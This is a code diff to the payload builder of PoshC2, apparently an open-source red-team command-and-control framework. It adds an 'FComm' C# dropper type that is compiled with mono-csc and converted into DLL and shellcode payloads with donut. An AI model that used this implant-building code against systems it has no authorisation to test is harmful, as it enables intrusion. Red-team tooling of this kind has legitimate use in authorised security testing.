@@ -3,7 +3,7 @@ import gzip, base64, subprocess, os, hashlib, shutil, re, donut, importlib
 from enum import Enum
 
 from poshc2.server.Config import PayloadsDirectory, PayloadTemplatesDirectory, DefaultMigrationProcess, PayloadModulesDirectory
-from poshc2.server.Config import PBindSecret as DefaultPBindSecret, PBindPipeName as DefaultPBindPipeName, PayloadDomainCheck as DefaultPayloadDomainCheck , StageRetries, StageRetriesInitialWait, StageRetriesLimit
+from poshc2.server.Config import PBindSecret as DefaultPBindSecret, PBindPipeName as DefaultPBindPipeName, PayloadDomainCheck as DefaultPayloadDomainCheck , StageRetries, StageRetriesInitialWait, StageRetriesLimit, FCommFileName as DefaultFCommFileName
 from poshc2.Colours import Colours
 from poshc2.Utils import gen_key, randomuri, formStr, offsetFinder, get_first_url, get_first_dfheader
 from poshc2.server.database.DB import get_url_by_id, get_default_url_id, select_item
@@ -15,13 +15,14 @@ class PayloadType(Enum):
     PBind = "PBind_v4"
     Sharp = "Sharp_v4"
     PBindSharp = "PBindSharp_v4"
+    FCommSharp = "FCommSharp_v4"
 
 
 class Payloads(object):
 
     quickstart = None
 
-    def __init__(self, KillDate, Key, Insecure, UserAgent, Referrer, ConnectURL, BaseDirectory, URLID=None, ImplantType="", PowerShellProxyCommand="", PBindPipeName=DefaultPBindPipeName, PBindSecret=DefaultPBindSecret, PayloadDomainCheck=DefaultPayloadDomainCheck):
+    def __init__(self, KillDate, Key, Insecure, UserAgent, Referrer, ConnectURL, BaseDirectory, URLID=None, ImplantType="", PowerShellProxyCommand="", PBindPipeName=DefaultPBindPipeName, PBindSecret=DefaultPBindSecret, PayloadDomainCheck=DefaultPayloadDomainCheck, FCommFileName=DefaultFCommFileName):
 
         if not URLID:
             URLID = get_default_url_id()
@@ -47,6 +48,7 @@ class Payloads(object):
         self.PBindPipeName = PBindPipeName
         self.PBindSecret = PBindSecret
         self.PayloadDomainCheck = PayloadDomainCheck
+        self.FCommFileName = FCommFileName if FCommFileName else DefaultFCommFileName
         self.BaseDirectory = BaseDirectory
         self.StageRetries = StageRetries
         self.StageRetriesLimit = StageRetriesLimit
@@ -153,6 +155,7 @@ class Payloads(object):
         self.QuickstartLog(f"C# Dropper EXE written to: {self.BaseDirectory}{name}dropper_cs.exe")
         self.QuickstartLog(f"C# PBind Powershell v4 EXE written to: {self.BaseDirectory}{name}dropper_cs_ps_pbind_v4.exe")
         self.QuickstartLog(f"C# PBind Dropper EXE written to: {self.BaseDirectory}{name}pbind_cs.exe")
+        self.QuickstartLog(f"C# FComm Dropper EXE written to: {self.BaseDirectory}{name}fcomm_cs.exe")
 
         # Powershell (system.management.automation.dll) Dropper
         with open("%sSharp_Powershell_Runner.cs" % PayloadTemplatesDirectory, 'r') as f:
@@ -227,6 +230,23 @@ class Payloads(object):
 
         os.rename("%sPB.exe" % (self.BaseDirectory), "%s%spbind_cs.exe" % (self.BaseDirectory, name))
 
+        # FComm CSharp Dropper
+        with open("%sfcomm.cs" % PayloadTemplatesDirectory, 'r') as f:
+            content = f.read()
+
+        content = str(content) \
+            .replace("#REPLACEKEY#", self.Key) \
+            .replace("#REPLACEFCOMMFILENAME#", self.FCommFileName)
+
+        with open("%s%sfcomm.cs" % (self.BaseDirectory, name), 'w') as f:
+            f.write(str(content))
+
+        subprocess.check_output("mono-csc %s%sfcomm.cs -out:%sFC.exe -target:exe -warn:1 -sdk:4" % (self.BaseDirectory, name, self.BaseDirectory), shell=True)
+
+        subprocess.check_output("mono-csc %s%sfcomm.cs -out:%sFC.exe -target:exe -warn:1 -sdk:4" % (self.BaseDirectory, name, self.BaseDirectory), shell=True)
+
+        os.rename("%sFC.exe" % (self.BaseDirectory), "%s%sfcomm_cs.exe" % (self.BaseDirectory, name))
+
     def PatchBytes(self, filename, dll, offset, payloadtype, name=""):
         filename = "%s%s" % (self.BaseDirectory, filename)
         with open(filename, 'wb') as f:
@@ -247,6 +267,9 @@ class Payloads(object):
 
         elif payloadtype == PayloadType.PBindSharp:
             srcfilename = "%s%s%s" % (self.BaseDirectory, name, "pbind_cs.exe")
+
+        elif payloadtype == PayloadType.FCommSharp:
+            srcfilename = "%s%s%s" % (self.BaseDirectory, name, "fcomm_cs.exe")
 
         with open(srcfilename, "rb") as f:
             dllbase64 = f.read()
@@ -289,6 +312,8 @@ class Payloads(object):
         self.CreateDll(f"{name}PBind_v4_x64.dll", f"{PayloadTemplatesDirectory}Sharp_v4_x64_dll.b64", PayloadType.PBind, name)
         self.CreateDll(f"{name}PBindSharp_v4_x86.dll", f"{PayloadTemplatesDirectory}Sharp_v4_x86_dll.b64", PayloadType.PBindSharp, name)
         self.CreateDll(f"{name}PBindSharp_v4_x64.dll", f"{PayloadTemplatesDirectory}Sharp_v4_x64_dll.b64", PayloadType.PBindSharp, name)
+        self.CreateDll(f"{name}FCommSharp_v4_x86.dll", f"{PayloadTemplatesDirectory}Sharp_v4_x86_dll.b64", PayloadType.FCommSharp, name)
+        self.CreateDll(f"{name}FCommSharp_v4_x64.dll", f"{PayloadTemplatesDirectory}Sharp_v4_x64_dll.b64", PayloadType.FCommSharp, name)
 
     def CreateShellcode(self, name=""):
         self.QuickstartLog(Colours.END)
@@ -303,6 +328,8 @@ class Payloads(object):
         self.CreateShellcodeFile(f"{name}PBind_v4_x64_Shellcode.bin", f"{name}PBind_v4_x64_Shellcode.b64", f"{PayloadTemplatesDirectory}Sharp_v4_x64_Shellcode.b64", PayloadType.PBind, name)
         self.CreateShellcodeFile(f"{name}PBindSharp_v4_x86_Shellcode.bin", f"{name}PBindSharp_v4_x86_Shellcode.b64", f"{PayloadTemplatesDirectory}Sharp_v4_x86_Shellcode.b64", PayloadType.PBindSharp, name)
         self.CreateShellcodeFile(f"{name}PBindSharp_v4_x64_Shellcode.bin", f"{name}PBindSharp_v4_x64_Shellcode.b64", f"{PayloadTemplatesDirectory}Sharp_v4_x64_Shellcode.b64", PayloadType.PBindSharp, name)
+        self.CreateShellcodeFile(f"{name}FCommSharp_v4_x86_Shellcode.bin", f"{name}FCommSharp_v4_x86_Shellcode.b64", f"{PayloadTemplatesDirectory}Sharp_v4_x86_Shellcode.b64", PayloadType.FCommSharp, name)
+        self.CreateShellcodeFile(f"{name}FCommSharp_v4_x64_Shellcode.bin", f"{name}FCommSharp_v4_x64_Shellcode.b64", f"{PayloadTemplatesDirectory}Sharp_v4_x64_Shellcode.b64", PayloadType.FCommSharp, name)
 
     def CreateSCT(self, name=""):
         self.QuickstartLog(Colours.END)
@@ -465,6 +492,17 @@ class Payloads(object):
             hexcode = "".join("\\x{:02x}".format(c) for c in shellcodesrc)
             shellcode64 = formStr("char sc[]", hexcode)
 
+        elif payloadtype == PayloadType.FCommSharp:
+            # Get the Sharp shellcode
+            with open("%s%sFCommSharp_v4_x86_Shellcode.bin" % (self.BaseDirectory, name), 'rb') as f:
+                shellcodesrc = f.read()
+            hexcode = "".join("\\x{:02x}".format(c) for c in shellcodesrc)
+            shellcode32 = formStr("char sc[]", hexcode)
+            with open("%s%sFCommSharp_v4_x64_Shellcode.bin" % (self.BaseDirectory, name), 'rb') as f:
+                shellcodesrc = f.read()
+            hexcode = "".join("\\x{:02x}".format(c) for c in shellcodesrc)
+            shellcode64 = formStr("char sc[]", hexcode)
+
         # Create the raw C file from the template
         with open("%s%s" % (PayloadTemplatesDirectory, sourcefile), 'r') as f:
             content = f.read()
@@ -543,6 +581,11 @@ class Payloads(object):
                 x86base64 = f.read()
             with open("%s%s" % (self.BaseDirectory, name + "PBindSharp_v4_x64_Shellcode.bin"), "rb") as f:
                 x64base64 = f.read()
+        elif payloadtype == PayloadType.FCommSharp:
+            with open("%s%s" % (self.BaseDirectory, name + "FCommSharp_v4_x86_Shellcode.bin"), "rb") as f:
+                x86base64 = f.read()
+            with open("%s%s" % (self.BaseDirectory, name + "FCommSharp_v4_x64_Shellcode.bin"), "rb") as f:
+                x64base64 = f.read()
 
         x86base64 = base64.b64encode(x86base64)
         x64base64 = base64.b64encode(x64base64)
@@ -585,6 +628,11 @@ class Payloads(object):
                 x86base64 = f.read()
             with open("%s%s" % (self.BaseDirectory, name + "PBindSharp_v4_x64_Shellcode.bin"), "rb") as f:
                 x64base64 = f.read()
+        elif payloadtype == PayloadType.FCommSharp:
+            with open("%s%s" % (self.BaseDirectory, name + "FCommSharp_v4_x86_Shellcode.bin"), "rb") as f:
+                x86base64 = f.read()
+            with open("%s%s" % (self.BaseDirectory, name + "FCommSharp_v4_x64_Shellcode.bin"), "rb") as f:
+                x64base64 = f.read()
 
         x86base64 = base64.b64encode(x86base64)
         x64base64 = base64.b64encode(x64base64)
@@ -621,6 +669,8 @@ class Payloads(object):
             sourcefile = "dropper_cs.exe"
         elif payloadtype == PayloadType.PBindSharp:
             sourcefile = "pbind_cs.exe"
+        elif payloadtype == PayloadType.FCommSharp:
+            sourcefile = "fcomm_cs.exe"
 
         shellcode32 = donut.create(file=f"{self.BaseDirectory}{name}{sourcefile}", arch=1)
         if shellcode32:
